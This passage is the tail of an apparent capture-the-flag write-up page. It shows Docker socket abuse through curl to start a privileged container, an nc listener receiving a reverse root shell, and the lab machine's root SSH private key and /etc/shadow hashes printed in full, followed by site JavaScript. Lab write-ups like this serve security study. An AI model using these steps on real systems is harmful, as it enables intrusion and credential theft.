+<div class="sourceCode" id="cb37"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">application@4dae106254bf:/dev/shm$</span> curl <span class="at">-s</span> <span class="at">-X</span> POST <span class="at">--unix-socket</span> /app/docker.sock <span class="st">"http://localhost/containers/exploit.se_root/start"</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb38"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension nc <span class="at">-lvnp</span> 4499</span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4499 ...</span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.10</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.171]</span> 57132</span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> cannot set terminal process group <span class="er">(</span><span class="ex">1</span><span class="kw">)</span><span class="bu">:</span> Inappropriate ioctl for device</span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="ex">bash:</span> no job control in this shell</span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="ex">root@cbe7b6cef335:/#</span> id</span>
+<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
+<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a><span class="ex">root@cbe7b6cef335:/#</span> cat /root/root.txt</span>
+<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a><span class="ex">9bf63e789d19a7507442df8e42d41225</span></span>
+<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a><span class="ex">root@cbe7b6cef335:/#</span> cat /root/.ssh/id_rsa</span>
+<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a><span class="ex">-----BEGIN</span> RSA PRIVATE KEY-----</span>
+<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a><span class="ex">MIIEpAIBAAKCAQEAxhCO2ZdFzdJj6zdL/L38ZGE7OzyRCnJ4qZJyz50X7Ux9JHWT</span></span>
+<span id="cb38-15"><a href="#cb38-15" aria-hidden="true" tabindex="-1"></a><span class="ex">7kZWP3uElhlwF2WbqsPoS/iUtAjV9keflS/38zfZEp1n/o7g+q8Fw+oxF0s/6fud</span></span>
+<span id="cb38-16"><a href="#cb38-16" aria-hidden="true" tabindex="-1"></a><span class="ex">hA4KieW/bKnG+aeaC/lBgx5L5EGqsw+RKeBqFmCVi8ySy1SEH4vy7mZzWO4w6Egy</span></span>
+<span id="cb38-17"><a href="#cb38-17" aria-hidden="true" tabindex="-1"></a><span class="ex">ywWyk1gxGBEUuq1xVT0Wvagw+AQtkTJ9jo7wEGA1kAsY0G02hbwelLSPppTx72Ei</span></span>
+<span id="cb38-18"><a href="#cb38-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Pyr2hb9m5pwK6ywz38+4h4dPkyijcbaR0LNNKzDaeBGD78RxbnszHUTXKO/EsQYD</span></span>
+<span id="cb38-19"><a href="#cb38-19" aria-hidden="true" tabindex="-1"></a><span class="ex">qEYqbFkSMgoMylW8wbxtS1I7T+TW4+tvQzgw9QIDAQABAoIBAQCH384PqX4Cj6Vq</span></span>
+<span id="cb38-20"><a href="#cb38-20" aria-hidden="true" tabindex="-1"></a><span class="ex">NHoVfcQKnMVEgu1BTHxIYCYRFUTXztQ+0cZU/L2oOTUgv3ytIFBlGpZen75rr3AQ</span></span>
+<span id="cb38-21"><a href="#cb38-21" aria-hidden="true" tabindex="-1"></a><span class="ex">ztvEPa8MlDB/W6p+8EeY0b7TwvJAd6f1/V32vKcwKINkqSfOFtNQCYOOzpbjlMTk</span></span>
+<span id="cb38-22"><a href="#cb38-22" aria-hidden="true" tabindex="-1"></a><span class="ex">p/Y+0ywUA9gzmnjNskIdXiWetHvG8hNBArCU2h9CdlAr2thi3j1j3DR7VBUvuwtw</span></span>
+<span id="cb38-23"><a href="#cb38-23" aria-hidden="true" tabindex="-1"></a><span class="ex">6ny1422XL8xyIMg1qjLh9kFy6Ndif+GmnzuoQW4a18lDflIZQC+03MPRaZUuUbVE</span></span>
+<span id="cb38-24"><a href="#cb38-24" aria-hidden="true" tabindex="-1"></a><span class="ex">pTIDztWjs1+YeVoGPq4nzy+1RsyrxCdA+0+0j6ZK6/++vJPsm+V1/xaModV+XRyg</span></span>
+<span id="cb38-25"><a href="#cb38-25" aria-hidden="true" tabindex="-1"></a><span class="ex">TjsQ0MJBAoGBAOnZ7qtDS/3qSXV6e+kzYcJUTF1d18gXaKfrEm3y09eKJ9mnApTf</span></span>
+<span id="cb38-26"><a href="#cb38-26" aria-hidden="true" tabindex="-1"></a><span class="ex">fW99PlP+wK+eLUbsdxz9xiBxGGuxB+XYclDLIkoIn2308ruBptYMz7LYkcaypsCB</span></span>
+<span id="cb38-27"><a href="#cb38-27" aria-hidden="true" tabindex="-1"></a><span class="ex">XEdi5bY8PlkXICXVhLaFNACydFf0Ve8cj4XG2t1WcBhKbVgCvIKbrzhxAoGBANjS</span></span>
+<span id="cb38-28"><a href="#cb38-28" aria-hidden="true" tabindex="-1"></a><span class="ex">7TmGIIdZarvx4icPboemviW6wbXYY79jGFA+zvQ6DFt3cNoLYKpFfzZoaOXrJyix</span></span>
+<span id="cb38-29"><a href="#cb38-29" aria-hidden="true" tabindex="-1"></a><span class="ex">ocFijM0Jc+BX0c13bhCgnjxnZ2/IV3ggeEjKVeuV5wx1+TzdjpR0EAbvWUjd2Q41</span></span>
+<span id="cb38-30"><a href="#cb38-30" aria-hidden="true" tabindex="-1"></a><span class="ex">xSL6kSRI+Po/6Tn9GuzWidMrygWMNT1JhEVVbuLFAoGALDI1+0QyvoBi9cL6XC6L</span></span>
+<span id="cb38-31"><a href="#cb38-31" aria-hidden="true" tabindex="-1"></a><span class="ex">0VBhRlwQBg72hpXU29bC1r+TnH0F7eD3MfT3rKQ/AnHgmMDkGiSUJ1l4hhHlLjlk</span></span>
+<span id="cb38-32"><a href="#cb38-32" aria-hidden="true" tabindex="-1"></a><span class="ex">EYTyrA9JIlzi6zEruNSfBGwN0QG+pi9Mo2k7hN+J4QiP2NaryFsQYvlXJ7BT9Wbu</span></span>
+<span id="cb38-33"><a href="#cb38-33" aria-hidden="true" tabindex="-1"></a><span class="ex">cRgOETre4JhgZfvOaNjHmuECgYBnW70cA9Uz0CsyJq8g4ZlV7uWLxMgcsGd0T3/C</span></span>
+<span id="cb38-34"><a href="#cb38-34" aria-hidden="true" tabindex="-1"></a><span class="ex">mP48rANCAuD4AB53bKOkwwbmOz+yhWLPdfQatZvYYOSxZnJAWOC1eLF1NvKDYC8W</span></span>
+<span id="cb38-35"><a href="#cb38-35" aria-hidden="true" tabindex="-1"></a><span class="ex">u+VTZWT7qq1CF3elSuJs++H6+05CGN29u+Y+fs65NIgwTXhtWCPhV2l5VYn3ijkU</span></span>
+<span id="cb38-36"><a href="#cb38-36" aria-hidden="true" tabindex="-1"></a><span class="ex">eBJg5QKBgQChntZ26dV5zBuH+sUBFDD38ATjMKWwKBy4EhogrPP1WPODi7MfPlSW</span></span>
+<span id="cb38-37"><a href="#cb38-37" aria-hidden="true" tabindex="-1"></a><span class="ex">9Pp/C6+rAd91VPcGo6TJD15CDhzTfzffHnjZJ0Nb6HDRL7mw6oimwVTLJttUk8GV</span></span>
+<span id="cb38-38"><a href="#cb38-38" aria-hidden="true" tabindex="-1"></a><span class="ex">QGGCfL85CcYSjPpqQp8ZOml4k/SaSzDUhb06PCuFi+i4afyuQyHAzw==</span></span>
+<span id="cb38-39"><a href="#cb38-39" aria-hidden="true" tabindex="-1"></a><span class="ex">-----END</span> RSA PRIVATE KEY-----</span>
+<span id="cb38-40"><a href="#cb38-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-41"><a href="#cb38-41" aria-hidden="true" tabindex="-1"></a><span class="ex">root@cbe7b6cef335:/#</span> cat /etc/shadow</span>
+<span id="cb38-42"><a href="#cb38-42" aria-hidden="true" tabindex="-1"></a><span class="ex">root:</span><span class="va">$6$XJ0deONw$c1ag</span><span class="ex">/76NHYRVSxMwMeoYPUDsxZDdjC6sX5KKa.QUHi2mjIwN1NlLyRt3QS3E6JjPknuSSOyIUcTTq2SbIXZle/:19157:0:99999:7:::</span></span>
+<span id="cb38-43"><a href="#cb38-43" aria-hidden="true" tabindex="-1"></a><span class="ex">jean:</span><span class="va">$6$2</span><span class="ex">ct8z568$.FX4a9sSYGk0QxQiqfiMFIRu.oGdRvGcFgtOz3Hu9bV2i6/Z.IpWlZxZn5iySUJuq9Rqw6oS8yTSFxbAZ4ede.:19156:0:99999:7:::</span></span>
+<span id="cb38-44"><a href="#cb38-44" aria-hidden="true" tabindex="-1"></a><span class="ex">charlie:</span><span class="va">$6$Ai</span><span class="ex">.uOoSz</span><span class="va">$8</span><span class="ex">QB.fXSM7pS2DDpUNBR3Xr3v3MUqlWdSmwEtOjOaRpH73UxGrcxJ/hPkM7h.MfFHM2gzoyHL0.c7s/glcc0Fu.:18995:0:99999:7:::</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+
+
+</section>
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+  window.document.addEventListener("DOMContentLoaded", function (event) {
+    const icon = "";
+    const anchorJS = new window.AnchorJS();
+    anchorJS.options = {
+      placement: 'right',
+      icon: icon
+    };
+    anchorJS.add('.anchored');
+    const isCodeAnnotation = (el) => {
+      for (const clz of el.classList) {
+        if (clz.startsWith('code-annotation-')) {                     
+          return true;
+        }
+      }
+      return false;
+    }
+    const onCopySuccess = function(e) {
+      // button target
+      const button = e.trigger;
+      // don't keep focus
+      button.blur();
+      // flash "checked"
+      button.classList.add('code-copy-button-checked');
+      var currentTitle = button.getAttribute("title");
+      button.setAttribute("title", "Copied!");
+      let tooltip;
+      if (window.bootstrap) {
+        button.setAttribute("data-bs-toggle", "tooltip");
+        button.setAttribute("data-bs-placement", "left");
+        button.setAttribute("data-bs-title", "Copied!");
+        tooltip = new bootstrap.Tooltip(button, 
+          { trigger: "manual", 
+            customClass: "code-copy-button-tooltip",
+            offset: [0, -8]});
+        tooltip.show();    
+      }
+      setTimeout(function() {
+        if (tooltip) {
+          tooltip.hide();
+          button.removeAttribute("data-bs-title");
+          button.removeAttribute("data-bs-toggle");
+          button.removeAttribute("data-bs-placement");
+        }
+        button.setAttribute("title", currentTitle);
+        button.classList.remove('code-copy-button-checked');
+      }, 1000);
+      // clear code selection
+      e.clearSelection();
+    }
+    const getTextToCopy = function(trigger) {
+        const codeEl = trigger.previousElementSibling.cloneNode(true);
+        for (const childEl of codeEl.children) {
+          if (isCodeAnnotation(childEl)) {
+            childEl.remove();
+          }
+        }
+        return codeEl.innerText;
+    }
+    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+      text: getTextToCopy
+    });
+    clipboard.on('success', onCopySuccess);
+    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+        text: getTextToCopy,
+        container: window.document.getElementById('quarto-embedded-source-code-modal')
+      });
+      clipboardModal.on('success', onCopySuccess);
+    }
+      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+      var mailtoRegex = new RegExp(/^mailto:/);
+        var filterRegex = new RegExp("https:\/\/exploit\.se");
+      var isInternal = (href) => {
+          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+      }
+      // Inspect non-navigation links and adorn them if external
+     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+      for (var i=0; i<links.length; i++) {
+        const link = links[i];
+        if (!isInternal(link.href)) {
+          // undo the damage that might have been done by quarto-nav.js in the case of
+          // links that we want to consider external
+          if (link.dataset.originalHref !== undefined) {
+            link.href = link.dataset.originalHref;
+          }
+        }
+      }
+    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+      const config = {
+        allowHTML: true,
+        maxWidth: 500,
+        delay: 100,
+        arrow: false,
+        appendTo: function(el) {
+            return el.parentElement;
+        },
+        interactive: true,
+        interactiveBorder: 10,
+        theme: 'quarto',
+        placement: 'bottom-start',
+      };
+      if (contentFn) {
+        config.content = contentFn;
+      }
+      if (onTriggerFn) {
+        config.onTrigger = onTriggerFn;
+      }
+      if (onUntriggerFn) {
+        config.onUntrigger = onUntriggerFn;
+      }
+      window.tippy(el, config); 
+    }
+    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+    for (var i=0; i<noterefs.length; i++) {
+      const ref = noterefs[i];
+      tippyHover(ref, function() {
+        // use id or data attribute instead here
+        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+        try { href = new URL(href).hash; } catch {}
+        const id = href.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note) {
+          return note.innerHTML;
+        } else {
+          return "";
+        }
+      });
+    }
+    const xrefs = window.document.querySelectorAll('a.quarto-xref');
+    const processXRef = (id, note) => {
+      // Strip column container classes
+      const stripColumnClz = (el) => {
+        el.classList.remove("page-full", "page-columns");
+        if (el.children) {
+          for (const child of el.children) {
+            stripColumnClz(child);
+          }
+        }
+      }
+      stripColumnClz(note)
+      if (id === null || id.startsWith('sec-')) {
+        // Special case sections, only their first couple elements
+        const container = document.createElement("div");
+        if (note.children && note.children.length > 2) {
+          container.appendChild(note.children[0].cloneNode(true));
+          for (let i = 1; i < note.children.length; i++) {
+            const child = note.children[i];
+            if (child.tagName === "P" && child.innerText === "") {
+              continue;
+            } else {
+              container.appendChild(child.cloneNode(true));
+              break;
+            }
+          }
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(container);
+          }
+          return container.innerHTML
+        } else {
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(note);
+          }
+          return note.innerHTML;
+        }
+      } else {
+        // Remove any anchor links if they are present
+        const anchorLink = note.querySelector('a.anchorjs-link');
+        if (anchorLink) {
+          anchorLink.remove();
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        if (note.classList.contains("callout")) {
+          return note.outerHTML;
+        } else {
+          return note.innerHTML;
+        }
+      }
+    }
+    for (var i=0; i<xrefs.length; i++) {
+      const xref = xrefs[i];
+      tippyHover(xref, undefined, function(instance) {
+        instance.disable();
+        let url = xref.getAttribute('href');
+        let hash = undefined; 
+        if (url.startsWith('#')) {
+          hash = url;
+        } else {
+          try { hash = new URL(url).hash; } catch {}
+        }
+        if (hash) {
+          const id = hash.replace(/^#\/?/, "");
+          const note = window.document.getElementById(id);
+          if (note !== null) {
+            try {
+              const html = processXRef(id, note.cloneNode(true));
+              instance.setContent(html);
+            } finally {
+              instance.enable();
+              instance.show();
+            }
+          } else {
+            // See if we can fetch this
+            fetch(url.split('#')[0])
+            .then(res => res.text())
+            .then(html => {
+              const parser = new DOMParser();
+              const htmlDoc = parser.parseFromString(html, "text/html");
+              const note = htmlDoc.getElementById(id);
+              if (note !== null) {
+                const html = processXRef(id, note);
+                instance.setContent(html);
+              } 
+            }).finally(() => {
+              instance.enable();
+              instance.show();
+            });
+          }
+        } else {
+          // See if we can fetch a full url (with no hash to target)
+          // This is a special case and we should probably do some content thinning / targeting
+          fetch(url)
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.querySelector('main.content');
+            if (note !== null) {
+              // This should only happen for chapter cross references
+              // (since there is no id in the URL)
+              // remove the first header
+              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+                note.children[0].remove();
+              }
+              const html = processXRef(null, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      }, function(instance) {
+      });
+    }
+        let selectedAnnoteEl;
+        const selectorForAnnotation = ( cell, annotation) => {
+          let cellAttr = 'data-code-cell="' + cell + '"';
+          let lineAttr = 'data-code-annotation="' +  annotation + '"';
+          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+          return selector;
+        }
+        const selectCodeLines = (annoteEl) => {
+          const doc = window.document;
+          const targetCell = annoteEl.getAttribute("data-target-cell");
+          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+          const lineIds = lines.map((line) => {
+            return targetCell + "-" + line;
+          })
+          let top = null;
+          let height = null;
+          let parent = null;
+          if (lineIds.length > 0) {
+              //compute the position of the single el (top and bottom and make a div)
+              const el = window.document.getElementById(lineIds[0]);
+              top = el.offsetTop;
+              height = el.offsetHeight;
+              parent = el.parentElement.parentElement;
+            if (lineIds.length > 1) {
+              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+              height = bottom - top;
+            }
+            if (top !== null && height !== null && parent !== null) {
+              // cook up a div (if necessary) and position it 
+              let div = window.document.getElementById("code-annotation-line-highlight");
+              if (div === null) {
+                div = window.document.createElement("div");
+                div.setAttribute("id", "code-annotation-line-highlight");
+                div.style.position = 'absolute';
+                parent.appendChild(div);
+              }
+              div.style.top = top - 2 + "px";
+              div.style.height = height + 4 + "px";
+              div.style.left = 0;
+              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+              if (gutterDiv === null) {
+                gutterDiv = window.document.createElement("div");
+                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+                gutterDiv.style.position = 'absolute';
+                const codeCell = window.document.getElementById(targetCell);
+                const gutter = codeCell.querySelector('.code-annotation-gutter');
+                gutter.appendChild(gutterDiv);
+              }
+              gutterDiv.style.top = top - 2 + "px";
+              gutterDiv.style.height = height + 4 + "px";
+            }
+            selectedAnnoteEl = annoteEl;
+          }
+        };
+        const unselectCodeLines = () => {
+          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+          elementsIds.forEach((elId) => {
+            const div = window.document.getElementById(elId);
+            if (div) {
+              div.remove();
+            }
+          });
+          selectedAnnoteEl = undefined;
+        };
+          // Handle positioning of the toggle
+      window.addEventListener(
+        "resize",
+        throttle(() => {
+          elRect = undefined;
+          if (selectedAnnoteEl) {
+            selectCodeLines(selectedAnnoteEl);
+          }
+        }, 10)
+      );
+      function throttle(fn, ms) {
+      let throttle = false;
+      let timer;
+        return (...args) => {
+          if(!throttle) { // first call gets through
+              fn.apply(this, args);
+              throttle = true;
+          } else { // all the others get throttled
+              if(timer) clearTimeout(timer); // cancel #2
+              timer = setTimeout(() => {
+                fn.apply(this, args);
+                timer = throttle = false;
+              }, ms);
+          }
+        };
+      }
+        // Attach click handler to the DT
+        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+        for (const annoteDlNode of annoteDls) {
+          annoteDlNode.addEventListener('click', (event) => {
+            const clickedEl = event.target;
+            if (clickedEl !== selectedAnnoteEl) {
+              unselectCodeLines();
+              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+              if (activeEl) {
+                activeEl.classList.remove('code-annotation-active');
+              }
+              selectCodeLines(clickedEl);
+              clickedEl.classList.add('code-annotation-active');
+            } else {
+              // Unselect the line
+              unselectCodeLines();
+              clickedEl.classList.remove('code-annotation-active');
+            }
+          });
+        }
+    const findCites = (el) => {
+      const parentEl = el.parentElement;
+      if (parentEl) {
+        const cites = parentEl.dataset.cites;
+        if (cites) {
+          return {
+            el,
+            cites: cites.split(' ')
+          };
+        } else {
+          return findCites(el.parentElement)
+        }
+      } else {
+        return undefined;
+      }
+    };
+    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+    for (var i=0; i<bibliorefs.length; i++) {
+      const ref = bibliorefs[i];
+      const citeInfo = findCites(ref);
+      if (citeInfo) {
+        tippyHover(citeInfo.el, function() {
+          var popup = window.document.createElement('div');
+          citeInfo.cites.forEach(function(cite) {
+            var citeDiv = window.document.createElement('div');
+            citeDiv.classList.add('hanging-indent');
+            citeDiv.classList.add('csl-entry');
+            var biblioDiv = window.document.getElementById('ref-' + cite);
+            if (biblioDiv) {
+              citeDiv.innerHTML = biblioDiv.innerHTML;
+            }
+            popup.appendChild(citeDiv);
+          });
+          return popup.innerHTML;
+        });
+      }
+    }
+  });
+  </script>
+</div> <!-- /content -->
+<footer class="footer">
+  <div class="nav-footer">
+    <div class="nav-footer-left">
+      &nbsp;
+    </div>   
+    <div class="nav-footer-center">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item">
+ © 2025 0xPThree - All Rights Reserved.
+  </li>  
+</ul>
+    </div>
+    <div class="nav-footer-right">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item compact">
+    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
+      <i class="bi bi-signal" role="img">
+</i> 
+    </a>
+  </li>  
+    <li class="nav-item compact">
+    <a class="nav-link" href="https://github.com/0xpthree">
+      <i class="bi bi-github" role="img">
+</i> 
+    </a>
+  </li>  
+    <li class="nav-item compact">
+    <a class="nav-link" href="../../index.xml">
+      <i class="bi bi-rss" role="img">
+</i> 
+    </a>
+  </li>  
+</ul>
+    </div>
+  </div>
+</footer>
+
+
+
+
+</body></html>
